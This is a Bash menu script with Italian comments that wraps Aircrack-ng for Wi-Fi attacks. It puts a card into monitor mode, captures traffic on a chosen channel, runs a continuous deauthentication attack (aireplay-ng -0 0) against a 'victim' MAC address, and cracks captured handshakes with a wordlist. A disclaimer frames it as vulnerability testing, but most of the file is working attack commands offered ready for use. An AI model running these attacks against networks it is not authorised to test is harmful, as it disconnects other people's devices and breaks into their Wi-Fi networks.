#!/bin/bash

# Variabile globale per il controllo del flusso
uscita=false

# Funzione per tornare al menu principale dopo Ctrl+C
function ritorna_al_menu() {
    echo -e "\nGoing back to main menu..."
    uscita=true
}

# Assicura che lo script esca in modo controllato
trap ritorna_al_menu SIGINT

# Menu principale
while true; do
    if [ "$uscita" = true ]; then
        uscita=false
        break
    fi
    clear
    echo   "================================================================================="
    echo   "    _____  .__                                    __                             "
    echo   "   /  _  \ |__|______   ________________    ____ |  | __           ____    ____  "
    echo   "  /  /_\  \|  \_  __ \_/ ___\_  __ \__  \ _/ ___\|  |/ /  ______  /    \  / ___\ "
    echo   " /    |    \  ||  | \/\  \___|  | \// __ \\  \___ |    <  /_____/ |   |  \/ /_/  >"
    echo   " \____|__  /__||__|    \___  >__|  (____  /\___  >__|_ \         |___|  /\___  /" 
    echo   "         \/                \/           \/     \/     \/              \//_____/"  
    echo   "===============================================written in Easyuite by fr4nc15===="
    echo   ""
    echo   "DISCLAIMER: I do not own nor I am the author of the Aircrack-ng software and its" 
    echo   "derivates. This suite was created to simplify the process of using Aircrack-ng" 
    echo   "to test Wifi vulnerabilities."
    echo   "Therefore I take no responsibility for misuse of this software."
    echo   ""
    echo "1. Execute Airmon-ng (requires a compatible wlan card)"
    echo "2. Execute Airodump-ng (monitor only)"
    echo "3. Execute Airodump-ng (capture mode)"
    echo "4. Deauth attack (new terminal recommended)"
    echo "5. Password cracking (requires a wordlist and a .cap file)"
    echo "6. Install Aircrack-ng"
    echo "99. Exit"
    echo "============================="
    read -p "Choose an option: " scelta

    case $scelta in
        1)
            while true; do
                if [ "$uscita" = true ]; then
                    uscita=false
                    break
                fi
                clear
    echo   "================================================================================="
    echo   "    _____  .__                                    __                             "
    echo   "   /  _  \ |__|______   ________________    ____ |  | __           ____    ____  "
    echo   "  /  /_\  \|  \_  __ \_/ ___\_  __ \__  \ _/ ___\|  |/ /  ______  /    \  / ___\ "
    echo   " /    |    \  ||  | \/\  \___|  | \// __ \\  \___ |    <  /_____/ |   |  \/ /_/  >"
    echo   " \____|__  /__||__|    \___  >__|  (____  /\___  >__|_ \         |___|  /\___  /" 
    echo   "         \/                \/           \/     \/     \/              \//_____/"  
    echo   "=============================================written in Easysuite by fr4nc15===="
                echo "1. Kill all processes"
                echo "2. Put your Wi-fi card in Monitor Mode"
                echo "3. Go back to main menu"
                echo "============================="
                read -p "Choose an option: " sotto_scelta

                case $sotto_scelta in
                    1)
                        echo -e "\nKilling all processes..."
                        sudo airmon-ng check kill
                        echo -e "\nProcesses killed. Hit Enter to continue..."
                        read
                        ;;

                    2)
                        echo -e "\nStarting Monitor Mode on your Wi-Fi card..."
                        sudo airmon-ng start wlo1
                        echo -e "\nWi-Fi card set in Monitor Mode. Hit Enter to continue..."
                        read
                        ;;

                    3)
                        break
                        ;;

                    *)
                        echo "Invalid option, try again."
                        ;;
                esac
            done
            ;;

        2)
            echo -e "\nExecuting Airodump-ng..."
            read -p "Insert your Wi-Fi card name (ex. wlan0/wlan0mon):" interfaccia
            sudo airodump-ng $interfaccia
            ;;

        3) echo -e "\nExecuting Airodump-ng in capture mode..."
	   read -p "Insert the channel number you want to monitor (just the number!):" channel
	   read -p "Insert the path where the capture files will be saved (ex. /home/user/capture/capturefile):" capturepath
           read -p "Insert the Wi-Fi interface to be used (make sure it is in monitor mode first!):" wifi
           read -p "All done! You have chosen channel $channel and the file will be saved in $capturepath. Hit Enter to start:"
           sudo airodump-ng -c$channel -w $capturepath $wifi
           if [ ! -e "$capturepath" ]; then
	       echo "Uh-oh, looks like that path doesn't exist, try again!"
           fi
           echo -e "\nCapture finished! Hit Enter to continue..."
           read
           ;;

   	4) read -p "You are about to start a Deauth attack, I suggest running this in a new terminal window to keep your work clean. Press Enter when ready..."
	   read -p "Type in the MAC Address of your victim:" macaddress
           read -p "Type in the interface you wish to use:" interface
           sudo aireplay-ng -0 0 -a $macaddress $interface
           echo -e "\nDeauth attack ended, exiting..."
           read
           ;;

    5) read -p "You are about to try and crack the password from a previously captured .cap file. You will also need a wordlist file and a valid handshake. Press Enter to continue..."
        read -p "Type in the word list path (ex. /home/rockyou.txt):" wordlist
        read -p "Type in the capture file location (ex. /home/capture.cap):" capture
        sudo aircrack-ng -w $wordlist $capture
        echo -e "\nAll done. Hit Enter to continue..."
        read
        ;;

	6)  echo -e "\nUpdating your system..."
	    sudo apt-get update && apt-get upgrade
	    echo -e "\nInstalling Aircrack-ng..."
	    sudo apt install aircrack-ng
	    echo -e "\nAircrack-ng has been successfully installed! Hit Enter to continue..."
	    read
	   ;;

        99)
            echo "Exiting..."
            exit 0
            ;;

        *)
            echo "Invalid option, try again."
            ;;
    esac

done
